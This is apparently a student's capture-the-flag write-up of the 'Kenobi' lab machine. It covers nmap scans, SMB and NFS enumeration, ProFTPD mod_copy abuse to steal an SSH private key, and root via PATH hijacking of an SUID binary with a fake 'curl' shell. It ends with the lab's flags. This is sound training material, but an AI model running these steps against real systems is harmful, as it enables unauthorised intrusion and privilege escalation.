### Kenobi


export IP: 10.10.150.254

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

Make sure you're connected to our network and deploy the machine.

Scan the machine with nmap, how many ports are open?
- 7


```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Kenobi]
└─$ nmap -sC -sV -oN nmap_results.txt 10.10.150.254
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 10:16 EDT
Nmap scan report for 10.10.150.254
Host is up (0.37s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/admin.html
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      35145/tcp   mountd
|   100005  1,2,3      36729/tcp6  mountd
|   100005  1,2,3      39637/udp6  mountd
|   100005  1,2,3      51423/udp   mountd
|   100021  1,3,4      42655/tcp6  nlockmgr
|   100021  1,3,4      46295/tcp   nlockmgr
|   100021  1,3,4      56133/udp6  nlockmgr
|   100021  1,3,4      59869/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-08-15T14:17:16
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-08-15T09:17:15-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.23 seconds

```

####  Enumerating Samba for shares

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.


Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.150.254`

SMB has two ports, 445 and 139.

Using the nmap command above, how many shares have been found?
- 3

```
┌──(kali㉿kali)-[/usr/share/nmap/scripts]
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.150.254
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 10:25 EDT
Nmap scan report for 10.10.150.254
Host is up (0.50s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.150.254\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.150.254\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.150.254\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 65.65 seconds
                                                                                                                       
┌──(kali㉿kali)-[/usr/share/nmap/scripts]
└─$ 


```


On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.

`smbclient //<ip>/anonymous`

Using your machine, connect to the machines network share.

smbclient //10.10.167.232/anonymous

```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.167.232/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877112 blocks available
smb: \> 

```


You can recursively download the SMB share too. Submit the username and password as nothing.

`smbget -R smb://<ip>/anonymous`

Open the file on the share. There is a few interesting things found.

Information generated for Kenobi when generating an SSH key for the user
Information about the ProFTPD server.
What port is FTP running on?
- 21

```
 This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"
ServerType                      standalone
DefaultServer                   on

# Port 21 is the standard FTP port.
Port                            21

# Don't use IPv6 support by default.
UseIPv6                         off

```


Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.167.232`

What mount can we see?
- /var

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Kenobi]
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.167.232
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 21:39 EDT
Nmap scan report for 10.10.167.232
Host is up (0.39s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 3.85 seconds
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Kenobi]
└─$ 

```

#### Gain initial access with ProFtpd

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

What is the version?
- 1.3.5

```
┌──(kali㉿kali)-[~]
└─$ nc 10.10.167.232 21          
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.167.232]

```


We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for exploit-db.com.

How many exploits are there for the ProFTPd running?
- 4

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Kenobi]
└─$ searchsploit ProFTPd 1.3.5
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                            | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                  | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                              | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                            | linux/remote/36742.txt
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Kenobi]
└─$ 

```

You should have found an exploit from ProFtpd's mod_copy module. 

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

![](../../img/Pasted%20image%2020220824093924.png)

We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

Lets mount the /var/tmp directory to our machine

```
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

![](../../img/Pasted%20image%2020220824094002.png)
![](../../img/Pasted%20image%2020220824094014.png)

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Kenobi]
└─$ sudo chmod 600 id_rsa                       
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Kenobi]
└─$ ssh -i id_rsa kenobi@10.10.167.232
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 

```

What is Kenobi's user flag (/home/kenobi/user.txt)?
- d0b0f3f53b6caa532a83915e19224899

```
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ 

```

#### Privilege Escalation with Path Variable Manipulation


![](../../img/Pasted%20image%2020220824094032.png)


Lets first understand what what SUID, SGID and Sticky Bits are.

Permission	On Files	On Directories
SUID Bit	User executes the file with permissions of the file owner	-
SGID Bit	User executes the file with the permission of the group owner.
File created in directory gets the same group owner.
Sticky Bit	No meaning	Users are prevented from deleting files from other users.



SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: find / -perm -u=s -type f 2>/dev/null

What file looks particularly out of the ordinary? 
- /usr/bin/menu

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$ 

```


Run the binary, how many options appear?
- 3

```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :

```


Strings is a command on Linux that looks for human readable strings on a binary.

![[Pasted image 20220816011411.png]]

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

![](../../img/Pasted%20image%2020220824094047.png)

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

```
kenobi@kenobi:/tmp$ echo /bin/sh >curl
kenobi@kenobi:/tmp$ ls
curl  systemd-private-0a0c25442b964ddd8d68ec3897908111-systemd-timesyncd.service-TPbqzq
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# whoami
root
# pwd
/tmp
# echo $SHELL
/bin/bash
# 

```


What is the root flag (/root/root.txt)?
- 177b3cd8562289f37382721c28381f02

```
# cd /root/
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02
# 

```

END